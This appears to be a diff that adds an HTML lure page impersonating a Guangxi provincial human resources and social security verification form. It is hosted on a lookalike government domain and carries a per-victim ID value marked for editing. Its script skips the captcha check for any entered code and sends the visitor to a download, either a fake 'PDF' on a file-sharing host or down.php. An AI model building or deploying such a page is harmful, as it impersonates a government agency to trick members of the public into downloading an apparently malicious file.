@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>广西壮族自治区人社表单验证</title>
+    <meta charset="UTF-8">
+    <style>
+        #image {
+            width: 90%;
+            /* margin-top: 4em; */
+        }
+
+
+        #form div {
+            display: flex;
+            width: 50%;
+            margin-top: 3.5rem;
+            flex-direction: column;
+            margin-left: 25%;
+        }
+    </style>
+</head>
+
+<body style="background:#f6f6f6;margin: -8px;">
+    <div style="background-color: #ffffff;float: right;height: 85vh;overflow: auto;">
+        <img id="image" src="http://mstzgov.cn/gxs/250310/1018/img/2.png" alt="Image" style="float: right;width: 95%;margin-top: 5rem;">
+        <div id="form" style="margin-top: 22rem;">            
+            <div>
+                <span
+                    style="color: #2c2d2d;font-size: 2.1rem;font-weight: bold;padding-left: 2rem;padding-bottom: 1.5rem;">验证号码：</span>
+                <input type="text"
+                    style="height:4rem;width: 100%; font-size: 2rem; background: #f7f7f7; border-color: #cfcfcf; color: #4f4f4f; box-sizing: border-box;"
+
+                    value="5f79e86a43c4224c94d61a94f11e6a0c">                            <!-- 修改这个位置 -->
+
+            </div>
+            <div>
+                <span
+                    style="color: #2c2d2d;font-size: 2.1rem;font-weight: bold;padding-left: 2rem;padding-bottom: 1.5rem;">验证码：</span>
+                <input type="text"
+                    style="width: 100%; font-size: 2rem; background: #f7f7f7; height: 4rem; border-color: #cfcfcf; color: #4f4f4f; box-sizing: border-box;border-right: none;"
+                    id="code" placeholder="  请输入图片的验证码">
+                <img id="captchaImage" width="45%" style="border: solid 0.1em #cbcbcb" src="http://mstzgov.cn/gxs/250310/1018/captcha.php" alt="验证码">
+            </div>
+            <div style="margin-top: 12em;">
+                <button type="submit" id="sub" style="width: 70%;
+                height: 2em;
+                background: #fe6603;
+                border: none;
+                border-radius: 3em;font-size:2.5em;    color: white;">查 询</button>
+            </div>
+        </div>
+        <img id="image" src="http://mstzgov.cn/gxs/250310/1018/img/beijing.png" alt="Image" style="width: 95%;float: right;">
+    </div>
+
+
+    <script>
+        // 刷新验证码图片
+        function refreshCaptchaImage() {
+            var captchaImage = document.getElementById('captchaImage');
+            captchaImage.src = "http://mstzgov.cn/gxs/250310/1018/captcha.php";
+        }
+
+        // 刷新按钮点击事件
+        var captchaImage = document.getElementById('captchaImage');
+        captchaImage.addEventListener('click', refreshCaptchaImage);
+
+        // 页面加载时刷新验证码图片
+        refreshCaptchaImage();
+
+        var sub = document.getElementById('sub');
+        sub.addEventListener('click', function () {
+            var code = document.getElementById('code').value;
+            if (code != '') {
+                location.href = 'https://yun.urldwz.com/f/Q69nca/5f79e86a43c4224c94d61a94f11e6a0c.pdf'
+                return
+            }
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        var p_code = xhr.responseText;
+                        if (code.toLowerCase() !== p_code.toLowerCase()) {
+                            alert('验证码错误！')
+                            return
+                        } else {
+                            location.href = './down.php'
+                        }
+                    } else {
+                        console.log('Failed to fetch code.php');
+                    }
+                }
+            };
+            xhr.open('GET', 'code.php', true);
+            xhr.send();
+        })
+    </script>
+</body>
+
+</html>
